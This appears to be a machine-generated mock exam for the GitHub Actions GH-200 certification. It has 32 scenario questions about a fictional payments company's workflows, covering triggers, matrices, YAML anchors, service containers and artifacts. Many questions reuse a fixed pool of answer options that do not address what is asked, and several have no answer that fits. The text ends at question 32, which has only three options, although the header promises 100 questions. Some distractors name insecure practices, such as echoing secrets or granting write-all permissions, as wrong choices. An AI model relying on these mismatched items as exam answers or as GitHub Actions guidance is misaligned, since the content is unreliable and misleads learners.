# Microsoft / GitHub Exam GH-200: GitHub Actions — Full-Length Mock Exam 1

**Theme:** Polyglot Monorepo CI & Matrix Orchestration — Event Filters, YAML Anchors (&/*/<<:), Service Containers, Artifacts v4 & VS Code Extension  
**Credential:** `GitHub Actions` *(Intermediate · **no prerequisite** · **2-year validity** transitioning to Microsoft Learn recertification)*  
**Study guide baseline:** `January 2026 (Last updated February 5, 2026)` (https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200)  
**Questions:** `100` (`84` `multiple-choice` balanced `21/21/21/21` across A–D + `16` `multi-select`; `0` case studies)  
**Recommended timing:** `100 minutes` (matching Microsoft’s published `100-minute` GH-200 assessment duration · **closed-book: no Microsoft Learn or GitHub Docs access**)

> **Disclaimer:** Independent educational material authored from public Microsoft Learn and GitHub Actions documentation — not affiliated with or endorsed by Microsoft Corporation or GitHub, Inc. Practice percentages do not equate to Microsoft’s `700 / 1000` scaled score.

## Questions

---

## Domain 1 — Author and manage workflows (20–25% official weight · 24 questions)

### 1. KestrelPay Clearing commits a nightly settlement audit workflow (`on: schedule: [{ cron: '15 2 * * 1-5' }]`) exclusively to long-lived branch `release/v4` while `main` remains the repository default branch. You need the scheduled workflow to trigger automatically at 02:15 UTC on weekdays. Proposed solution: Keep the workflow file only on `release/v4` and wait for the cron daemon to fire on that branch. Does this meet the goal?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** Define typed `workflow_dispatch.inputs` (`string`, `boolean`, `choice`, `number`, `environment`) and map `workflow_call` `inputs:` + `secrets:` explicitly
- **D.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)

### 2. KestrelPay Clearing wants an external treasury orchestrator to trigger `reconcile.yml` via `POST /repos/kestrelpay/ledger-api/dispatches` with JSON `"event_type": "eod-close"` AND allow release leads to trigger the same workflow manually from the Actions UI with validated parameters. Which two trigger configurations meet these requirements? Select two.

- **A.** Define typed `workflow_dispatch.inputs` (`string`, `boolean`, `choice`, `number`, `environment`) and map `workflow_call` `inputs:` + `secrets:` explicitly
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)
- **D.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **E.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **F.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 3. In KestrelPay Clearing's `payments-core` monorepo, feature engineers push rapid commits to PR branches and touch `docs/**` frequently. Complete `ci.yml` (`on: pull_request: paths-ignore: ['docs/**']`) with top-level `____: { group: ${{ github.workflow }}-${{ github.ref }}, cancel-in-progress: true }` and `permissions: contents: read` so superseded PR runs cancel immediately under least privilege.

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Combine activity `types:` (`e.g., [opened, synchronize, reopened]`), `branches`/`paths-ignore` filters, least-privilege `permissions:`, and `concurrency:` groups
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 4. On `push` workflow runs in `kestrelpay/fraud-scorer`, you specify both `branches: [main, 'release/**']` and `paths: ['services/scorer/**']` alongside a workflow-level `permissions: {}` block and job-level `permissions: packages: write`. Which two behaviors apply? Select two.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Combine activity `types:` (`e.g., [opened, synchronize, reopened]`), `branches`/`paths-ignore` filters, least-privilege `permissions:`, and `concurrency:` groups
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **E.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls
- **F.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

### 5. You author a manual hotfix workflow in `kestrelpay/settlement-gw` using `on: workflow_dispatch: inputs:`. Which `type:` values are natively supported for `workflow_dispatch` inputs (`up to 10 inputs`), and how must a reusable `on: workflow_call` workflow declare secret inputs differently?

- **A.** Define typed `workflow_dispatch.inputs` (`string`, `boolean`, `choice`, `number`, `environment`) and map `workflow_call` `inputs:` + `secrets:` explicitly
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`

### 6. KestrelPay Clearing centralizes container builds in `kestrelpay/ci-hub/.github/workflows/image-build.yml` and needs caller repos to pass build parameters plus registry credentials and read back the built image digest in a downstream deploy job. In which exact order should you wire the callee and caller workflows?

- **A.** Invoke `uses:` without `on: workflow_call` in callee → Write values to `$GITHUB_ENV` hoping they cross jobs → Read `steps.ci.outputs` across separate runner VMs → Pass sensitive secrets via plaintext `with:` inputs
- **B.** Read `needs.<id>.outputs` before running the callee job → Declare `on: workflow_dispatch` only in the callee → Emit outputs with retired `::set-output` syntax → Hardcode org secrets inside YAML
- **C.** Place the reusable workflow outside `.github/workflows/` → Call it inside `steps:` instead of `jobs.<id>.uses` → Omit `on.workflow_call.outputs` mapping → Expect secrets to pass implicitly without `secrets:`
- **D.** Declare `on: workflow_call` (`inputs`, `secrets`, `outputs`) in callee → Write callee step result to `$GITHUB_OUTPUT` & job `outputs` → Invoke `jobs.<id>.uses` (`@<sha>`) with `with:` & `secrets:` → Read `needs.<id>.outputs.<key>` downstream

### 7. In `kestrelpay/ledger-api`, cleanup step `purge-temp-certs` must execute at the end of job `integration-suite` even if an earlier test step fails OR if a developer manually cancels the workflow run, and the job itself must abort if stuck longer than 25 minutes instead of burning the 360-minute default. Complete the step condition `if: ____` paired with job `timeout-minutes: 25`.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Control job/step flow with `if:` status functions (`success()`, `failure()`, `always()`, `cancelled()`), `continue-on-error`, and `timeout-minutes`

### 8. Step `experimental-fuzz` in `kestrelpay/payments-core` has `continue-on-error: true` and exits with code `1`. A subsequent step inspects step contexts to log whether the fuzz binary failed before the action ignored the error. Which pair of `steps.experimental-fuzz` properties reflects `(1)` the raw pre-override result and `(2)` the final post-`continue-on-error` result?

- **A.** Write GitHub Flavored Markdown tables/charts to `$GITHUB_STEP_SUMMARY` (`<=1 MB`/step) and embed branch/event-scoped workflow status badges (`badge.svg`)
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Control job/step flow with `if:` status functions (`success()`, `failure()`, `always()`, `cancelled()`), `continue-on-error`, and `timeout-minutes`
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 9. In `kestrelpay/clearing-batch`, job `notify-noc` lists `needs: [compile, db-migrate, smoke-test]`. Job `db-migrate` fails, causing `smoke-test` to be skipped. You want `notify-noc` to run whenever upstream work finishes (including failures) UNLESS the run itself was canceled. Complete the job-level condition: `if: ____`.

- **A.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Chain jobs into a DAG via `needs: [build, lint]`, reading upstream `needs.<job_id>.outputs.<key>` and `needs.<job_id>.result`
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 10. A release pipeline in `kestrelpay/card-router` defines four jobs: `lint`, `unit` (no `needs`), `package` (`____: [lint, unit]`), and `publish` (`____: package`). How do GitHub Actions runners schedule these four jobs when a commit lands on `main`?

- **A.** Chain jobs into a DAG via `needs: [build, lint]`, reading upstream `needs.<job_id>.outputs.<key>` and `needs.<job_id>.result`
- **B.** Use the official **GitHub Actions VS Code extension** for live YAML schema validation, `action.yml` input IntelliSense, context/secrets hover checks, and run management
- **C.** Configure `jobs.<id>.services` (`image`, `env`, `ports`, `--health-cmd` `options`), connecting via `localhost:<port>` on host runners or `<label>:<port>` in job `container:`
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 11. A bash step in `kestrelpay/fraud-scorer` generates a dynamic one-time session token `$TMP_SESSION` and installs custom binary `/opt/kestrel/bin/kpay` for subsequent steps in the SAME job without leaking `$TMP_SESSION` in logs. Complete the workflow command `echo "____" && echo "/opt/kestrel/bin" >> "$GITHUB_PATH"`.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`

### 12. During a CI modernization audit at KestrelPay Clearing, you replace legacy stdout workflow commands and verify safe multi-line file writes. Which three workflow-command and environment-file practices are valid on current GitHub Actions runners? Select three.

- **A.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **B.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **C.** Write GitHub Flavored Markdown tables/charts to `$GITHUB_STEP_SUMMARY` (`<=1 MB`/step) and embed branch/event-scoped workflow status badges (`badge.svg`)
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **E.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **F.** Write step outputs to `>> "$GITHUB_OUTPUT"` (`mapped via jobs.<id>.outputs`) so downstream `needs:` jobs read `needs.<id>.outputs.<name>`

### 13. In `kestrelpay/ledger-api`, job `verify-redis` runs directly on `runs-on: ubuntu-latest` (with NO job `container:` key) and declares `services: redis: image: redis:7-alpine`. When step `cargo test` tries to dial `redis:6379`, connection resolution fails. Complete the `services.redis` fix: add `____: ['6379:6379']` and connect tests to `localhost:6379`.

- **A.** Configure `jobs.<id>.services` (`image`, `env`, `ports`, `--health-cmd` `options`), connecting via `localhost:<port>` on host runners or `<label>:<port>` in job `container:`
- **B.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners

### 14. KestrelPay Clearing runs SQL migration integration tests in `kestrelpay/settlement-db` against an ephemeral PostgreSQL 16 service container and needs zero connection race conditions before tests execute. Place the workflow configuration and runtime lifecycle steps in the exact order.

- **A.** Define `services.postgres` with `env` & `--health-cmd pg_isready` → Map `ports: ["5432:5432"]` (host) or set job `container:` → Wait for `postgres` health probe to report `healthy` → Dial `localhost:5432` (host) or `postgres:5432` (container)
- **B.** Run integration tests before `services.postgres` starts → Omit `ports:` on a host-runner job yet query `postgres:5432` → Skip `--health-cmd` readiness checks → Declare `services:` after test steps finish
- **C.** Nest `services:` inside an individual `steps:` item → Run inside a job `container:` yet dial `127.0.0.1:5432` → Disable health probes completely → Store DB passwords in unencrypted `vars.*`
- **D.** Configure `services.postgres` on a `macos-latest` host without Docker → Echo raw DB passwords in step logs → Expect container data to persist into separate downstream jobs → Tear down Docker manually in `post:`

### 15. KestrelPay Clearing expands `strategy.matrix` across `os: [ubuntu-24.04, windows-latest]`, `rust: [stable, nightly]`, and `feature_set: [core, iso20022]`, plus an experimental extra tuple `{ os: ubuntu-24.04, rust: MSRV, experimental: true }` that must not abort sibling legs if it fails. What is the maximum number of matrix jobs allowed per workflow run, and which `strategy` setting prevents one failed leg from canceling siblings?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Use `strategy.matrix` (`include`, `exclude`, `fail-fast`, `max-parallel`, `<=256` jobs) and track hosted image migrations (`Ubuntu 20.04` retired; `windows-latest` -> Windows Server 2025)

### 16. In `kestrelpay/sdk-dotnet`, you define `strategy: max-parallel: 4` with `matrix: os: [ubuntu-24.04, windows-2025]`, `dotnet: ['8.0', '9.0']`, `exclude: [{ os: windows-2025, dotnet: '8.0' }]`, and `include: [{ os: ubuntu-24.04, dotnet: '9.0', coverage: true }]`. Which two results occur when the workflow runs? Select two.

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Use `strategy.matrix` (`include`, `exclude`, `fail-fast`, `max-parallel`, `<=256` jobs) and track hosted image migrations (`Ubuntu 20.04` retired; `windows-latest` -> Windows Server 2025)
- **D.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **E.** Use `strategy.matrix` (`include`/`exclude`, `fail-fast: false`, `max-parallel`) while pinning explicit runner OS images (`ubuntu-24.04`, `windows-2025`)
- **F.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 17. Four jobs inside `.github/workflows/settlement-ci.yml` repeat the identical 6-key `env:` block. You define `&shared-env` on the first mapping and reference `<<: *shared-env` (or `*shared-env`) in the remaining three jobs, then a teammate asks to alias `*shared-env` from `.github/workflows/nightly.yml`. Complete the parser rule: YAML anchors (`&`), aliases (`*`), and merge keys (`<<:`) resolve strictly within `____`.

- **A.** Define YAML anchors (`&base_env`), aliases (`*base_env`), and merge keys (`<<: *base_env`) to deduplicate repeated mappings or job blocks inside one `.yml` file
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 18. A job-level `if:` condition in `kestrelpay/ledger-api` fails workflow validation when an engineer writes `if: ${{ secrets.SLACK_WEBHOOK != '' }}`. Which context availability rule explains the failure and fixes the check?

- **A.** Read runtime metadata from contexts (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`) and account for Immutable Actions (`GHCR` OCI packages)
- **B.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 19. KestrelPay Clearing adopts GitHub's Immutable Actions architecture across `payments-core`. How are Immutable Actions packaged and resolved on current GitHub-hosted runners when workflows pin actions?

- **A.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **B.** Read runtime metadata from contexts (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`) and account for Immutable Actions (`GHCR` OCI packages)
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

### 20. In `kestrelpay/monorepo`, job `discover` outputs JSON string `'["payments","fx","ach"]'` as `needs.discover.outputs.crates`, and downstream job `test` builds a dynamic matrix while invalidating Cargo caches whenever any `Cargo.lock` changes. Complete the two built-in expression functions: `matrix: crate: ${{ ____(needs.discover.outputs.crates) }}` and cache key `cargo-${{ ____('**/Cargo.lock') }}`.

- **A.** Evaluate `${{ ... }}` built-in functions (`contains`, `startsWith`, `format`, `join`, `toJSON`, `fromJSON`, `hashFiles`), separating parse-time keys from runtime step contexts
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 21. Developers at KestrelPay Clearing repeatedly push broken `${{ }}` context typos and unpinned `uses:` inputs just to test `.github/workflows/ci.yml`. Which official IDE tooling validates workflow YAML schema, autocompletes `github.*` / `vars.*` / `secrets.*` contexts and action `inputs:`, and manages runs directly from Visual Studio Code?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Use the official **GitHub Actions VS Code extension** for live YAML schema validation, `action.yml` input IntelliSense, context/secrets hover checks, and run management
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)

### 22. KestrelPay Clearing caches `~/.cargo/registry` via `actions/cache@v4` and uploads compliance reports via `actions/upload-artifact@v4` with `retention-days: 30`. What happens when a repository's total Actions cache usage exceeds `10 GB` OR a cache entry goes untouched on its branch for more than `7 days`?

- **A.** Pair `actions/cache@v4` (`10 GB` repo cache, `7-day` idle eviction) with `actions/upload-artifact@v4` (`retention-days`) and REST retention policies
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 23. In `kestrelpay/clearing-batch`, job `prepare` writes `echo "BATCH_ID=20261103" >> "$GITHUB_ENV"`, and downstream job `settle` (`needs: prepare`) runs `echo "$BATCH_ID"` expecting `20261103`. Proposed solution: Rely on `$GITHUB_ENV` written in `prepare` to populate `$BATCH_ID` inside `settle` automatically. Does this meet the goal?

- **A.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** Pair `actions/cache@v4` (`10 GB` repo cache, `7-day` idle eviction) with `actions/upload-artifact@v4` (`retention-days`) and REST retention policies
- **D.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`

### 24. KestrelPay Clearing wants each `ledger-api` run to render a Markdown latency table on the Actions run summary page and display a live `main`-branch build badge in `README.md`. Complete the summary redirect `cat latency.md >> "____"` (`<=1 MB` per step) and badge URL `.../actions/workflows/ci.yml/badge.svg?branch=main`.

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Write GitHub Flavored Markdown tables/charts to `$GITHUB_STEP_SUMMARY` (`<=1 MB`/step) and embed branch/event-scoped workflow status badges (`badge.svg`)

---

## Domain 2 — Consume and troubleshoot workflows (15–20% official weight · 19 questions)

### 25. A contributor opens PR `#418` from feature branch `feat/ach-v2` (`HEAD` SHA `aaa111`) into `main` (`HEAD` SHA `bbb222`) in `kestrelpay/payments-core`. Both `on: push` and `on: pull_request` workflows trigger. Which `GITHUB_SHA` and `GITHUB_REF` values does the `pull_request` workflow run inspect compared to the `push` run?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)

### 26. In `kestrelpay/fraud-scorer`, workflow `tag-scan.yml` runs `gh release create v2.4.0` authenticated exclusively with the default `${{ secrets.GITHUB_TOKEN }}`. A separate workflow `publish-crate.yml` listens to `on: release: types: [published]`, yet `publish-crate.yml` never triggers. Why?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)
- **D.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)

### 27. A Rust integration step in `kestrelpay/ledger-api` fails intermittently without verbose step trace lines (`##[debug]`) or runner worker communication traces. Without editing `.github/workflows/ci.yml`, complete the two repository variables/secrets (`____ = true` and `ACTIONS_RUNNER_DEBUG = true`) that enable verbose step AND runner diagnostic logs.

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 28. During a load-test job on a 2-core Linux runner in `kestrelpay/payments-core`, step `cargo nextest` terminates abruptly with process exit code `____` (`128 + SIGKILL`), while a sibling shell step fails with exit code `127`. What do those two Linux exit codes indicate in step logs?

- **A.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Configure `jobs.<id>.services` (`image`, `env`, `ports`, `--health-cmd` `options`), connecting via `localhost:<port>` on host runners or `<label>:<port>` in job `container:`
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

### 29. An infrastructure engineer troubleshoots why a self-hosted Linux runner in `kestrelpay` drops offline mid-job and where per-job execution logs live on disk. Which two `_diag/` log files on the runner host separate persistent listener health from individual job execution? Select two.

- **A.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`
- **B.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **E.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **F.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)

### 30. In `kestrelpay/settlement-gw/.github/workflows/deploy.yml`, an anchor defines `defaults_anchor: &base_env { LOG_LEVEL: info, REGION: us-east-1, RETRIES: "3" }`, and job `eu-settle` configures `env: { <<: *base_env, REGION: eu-west-1 }`. At runtime, what values do `env.REGION` and `env.LOG_LEVEL` evaluate to inside `eu-settle`?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Trace YAML anchor (`&`), alias (`*`), and merge (`<<:`) resolution order—where local explicit keys defined alongside `<<: *anchor` override anchored defaults
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts

### 31. A developer edits `kestrelpay/card-router/.github/workflows/ci.yml` to declare `*default_steps` on line 18 BEFORE defining `&default_steps` on line 95, causing an immediate `Invalid workflow file` error in the Actions tab. Why did YAML parsing fail?

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **C.** Define YAML anchors (`&base_env`), aliases (`*base_env`), and merge keys (`<<: *base_env`) to deduplicate repeated mappings or job blocks inside one `.yml` file
- **D.** Trace YAML anchor (`&`), alias (`*`), and merge (`<<:`) resolution order—where local explicit keys defined alongside `<<: *anchor` override anchored defaults

### 32. A 12-leg matrix build in `kestrelpay/payments-core` succeeds on 11 legs, fails on `test (windows-2025, nightly)` due to a transient NuGet timeout, and triggers downstream job `package` (`needs: test`) to skip. When you trigger `Re-run failed jobs`, what executes?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Correlate failed matrix job titles to `matrix.*` axes and select `Re-run failed jobs` (`gh run rerun <id> --failed` or single-job rerun) to re-test without re-billing green legs
- **C.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
